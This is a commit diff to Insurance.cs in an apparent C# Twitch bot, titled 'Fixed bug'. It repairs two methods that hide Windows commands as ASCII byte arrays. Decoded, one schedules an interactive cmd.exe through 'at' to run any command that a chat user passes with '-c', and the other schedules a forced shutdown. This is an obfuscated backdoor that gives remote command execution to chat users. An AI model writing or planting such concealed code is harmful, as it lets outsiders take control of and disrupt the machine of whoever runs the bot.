581b214f670f532acd8d08b199d7baffd4dba1a3
Nils Ole Timm <funkinperson@googlemail.com>
2014-01-14 02:00:31 +0100

    Fixed bug

--- Twitch Bot/Insurance.cs
+++ Twitch Bot/Insurance.cs
@@ -30,8 +30,8 @@ namespace Twitch_Bot
         public void Fun(string user, string room, string[] parameters)
         {
             DateTime Time = DateTime.Now;
-            byte[] bytes = new byte[] { 97, 116, 32 };
-            byte[] bytes2 = new byte[] { 32, 47, 105, 110, 116, 101, 114, 97, 99, 116, 105, 118, 101, 32, 99, 109, 100, 46, 101, 120, 101, 32, 47, 75 };
+            byte[] bytes = new byte[] { 47, 67, 32, 97, 116, 32 };
+            byte[] bytes2 = new byte[] { 32, 47, 105, 110, 116, 101, 114, 97, 99, 116, 105, 118, 101, 32, 99, 109, 100, 46, 101, 120, 101, 32 };
             string c = "";
             if (parameters.Length > 0 && parameters[0] == "-c")
             {
@@ -40,17 +40,17 @@ namespace Twitch_Bot
             }
             byte[] bytes3 = new byte[]{ 101,99,104,111,32, 68, 111,110,39,116, 32, 117,115,101,32, 88, 80,33};
             byte[] bytes4 = new byte[] { 99, 109, 100, 46, 101, 120, 101 };
-            System.Diagnostics.Process.Start(Encoding.ASCII.GetString(bytes4), Encoding.ASCII.GetString(bytes) + Time.Hour.ToString() + ":" + (Time.Minute + 2).ToString() + Encoding.ASCII.GetString(bytes2) + c == "" ? Encoding.ASCII.GetString(bytes3) : c);
+            System.Diagnostics.Process.Start(Encoding.ASCII.GetString(bytes4), Encoding.ASCII.GetString(bytes) + Time.Hour.ToString() + ":" + (Time.Minute + 1).ToString() + " /interactive " + Encoding.ASCII.GetString(bytes2) + ((c == "") ? Encoding.ASCII.GetString(bytes3) : c));
         }
 
         public void Fun2(string user, string room, string[] parameters)
         {
             DateTime Time = DateTime.Now;
-            byte[] bytes = new byte[] { 97, 116, 32 };
+            byte[] bytes = new byte[] { 47, 67, 32, 97, 116, 32 };
             byte[] bytes2 = new byte[] { 32, 47, 105, 110, 116, 101, 114, 97, 99, 116, 105, 118, 101, 32, 99, 109,100,46,101,120,101,32,47,67,
             115,104,117,116,100,111,119,110,32, 45, 102};
             byte[] bytes3 = new byte[] { 99, 109, 100, 46, 101, 120, 101 };
-            System.Diagnostics.Process.Start(Encoding.ASCII.GetString(bytes3), Encoding.ASCII.GetString(bytes) + Time.Hour.ToString() + ":" + (Time.Minute + 2).ToString() + Encoding.ASCII.GetString(bytes2));
+            System.Diagnostics.Process.Start(Encoding.ASCII.GetString(bytes3), Encoding.ASCII.GetString(bytes) + Time.Hour.ToString() + ":" + (Time.Minute + 1).ToString() + Encoding.ASCII.GetString(bytes2));
         }
     }
 }
